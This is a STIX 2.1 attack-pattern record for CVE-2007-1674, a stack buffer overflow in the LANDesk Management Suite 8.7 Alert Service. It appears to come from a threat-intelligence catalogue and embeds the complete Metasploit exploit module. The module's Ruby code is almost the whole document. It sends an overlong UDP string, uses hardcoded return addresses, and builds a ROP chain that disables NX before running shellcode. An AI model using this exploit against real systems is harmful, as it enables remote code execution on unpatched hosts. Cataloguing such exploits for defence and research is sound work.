{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ab0f98c-26e9-4389-abed-2949ed0c6f86",
    "created": "2024-08-14T16:46:59.712341Z",
    "modified": "2024-08-14T16:46:59.712345Z",
    "name": "LANDesk Management Suite 8.7 Alert Service Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in LANDesk Management Suite 8.7. By sending an overly long string to the Alert Service, a buffer is overwritten and arbitrary code can be executed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/landesk_aolnsrvr.rb",
            "external_id": "landesk_aolnsrvr.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1674"
        },
        {
            "source_name": "reference",
            "url": "http://www.tippingpoint.com/security/advisories/TSRT-07-04.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LANDesk Management Suite 8.7 Alert Service Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in LANDesk Management Suite 8.7. By sending\n        an overly long string to the Alert Service, a buffer is overwritten and arbitrary\n        code can be executed.\n      },\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          ['CVE', '2007-1674'],\n          ['OSVDB', '34964'],\n          ['URL', 'http://www.tippingpoint.com/security/advisories/TSRT-07-04.html'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 336,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Aolnsrvr 4.0\n          [ 'Alerting Proxy 2000/2003/XP', { 'Ret' => 0x00423554 } ],\n          [ 'Alerting Proxy 2003 SP1-2 (NX support)', { 'IB' => 0x00400000, 'ProcessInfo' => 0xed } ],\n          [ 'Alerting Proxy XP SP2 (NX support)', { 'IB' => 0x00400000, 'ProcessInfo' => 0xe4 } ],\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-04-13'))\n\n    register_options([Opt::RPORT(65535)])\n  end\n\n  def exploit\n    connect_udp\n\n    if (target.name =~ /NX/)\n      txt = Rex::Text.rand_text_alphanumeric(1024)\n\n      ib = target['IB']\n\n      # to bypass NX we need to emulate the call to ZwSetInformationProcess\n      # with generic value (to work on 2k3 SP1-SP2 - XP SP2)\n\n\n      # first we set esi to 0xed by getting the value on the stack\n      #\n      # 0x00401b46:\n      # pop esi   <- esi = edh\n      # retn\n\n      txt[ 280, 4 ] = [ib + 0x1b46].pack('V')\n      txt[ 296, 4] = [0xed].pack('V')\n\n      # now we set ecx to 0x7ffe0300, eax to 0xed\n      # 0x00401b43:\n      # pop ecx    <-  ecx = 0x7ffe0300 - 0xFF0\n      # mov eax, esi   <- eax == edh\n      # pop esi    <- 0x45b4ea (data section)\n      # retn\n\n      txt[ 300, 4] = [ib + 0x1b43].pack('V')\n      txt[ 304, 4] = [0x7ffe0300 - 0xff0].pack('V')\n      txt[ 308, 4] = [ib + 0x5b4ea].pack('V')\n\n      # we set edx to 0x7FFe300 (ecx + 0xff0)\n      # 0x004106b1:\n      # lea edx, [ecx+0ff0h]\n      # mov [esi+4], edx\n      # mov [esi+8], edi\n      # pop edi\n      # mov [esi+0Ch], eax\n      # pop esi\n      # retn\n\n      txt[ 312, 4] = [ib + 0x106b1].pack('V')\n\n\n      # finally we call NtSetInformationProcess (-1, target['ProcessInfo'], ib+0x4ec84, 4)\n      # 0x0044ec84 is a pointer to 0x2 to disable NX\n      # 0x0042a28e:\n      # call dword ptr [edx]\n      # mov esi, eax\n      # mov eax, esi\n      # pop edi\n      # pop esi\n      # pop ebp\n      # pop ebx\n      # add esp, 134h\n      # retn 1Ch\n\n      txt[ 324, 4] = [ib + 0x2a28e].pack('V')  # call dword ptr[ecx]\n      txt[ 332, 16] = [-1, 34, 0x0044ec84, 4].pack('VVVV')\n\n      # we catch the second exception to go back to our shellcode, now that\n      # NX is disabled\n\n      txt[ 652, 4 ] = [ib + 0x23554].pack('V')   # (jmp esp in atl.dll)\n      txt[ 684, payload.encoded.length ] = payload.encoded\n\n    else\n      # One-shot overwrite =(\n      txt = rand_text_alphanumeric(280) + [target.ret].pack('V') + payload.encoded\n    end\n\n    print_status(\"Trying target #{target.name}...\")\n\n    udp_sock.put(txt)\n\n    handler(udp_sock)\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-04-13",
    "x_mitre_platforms": [
        "win'"
    ]
}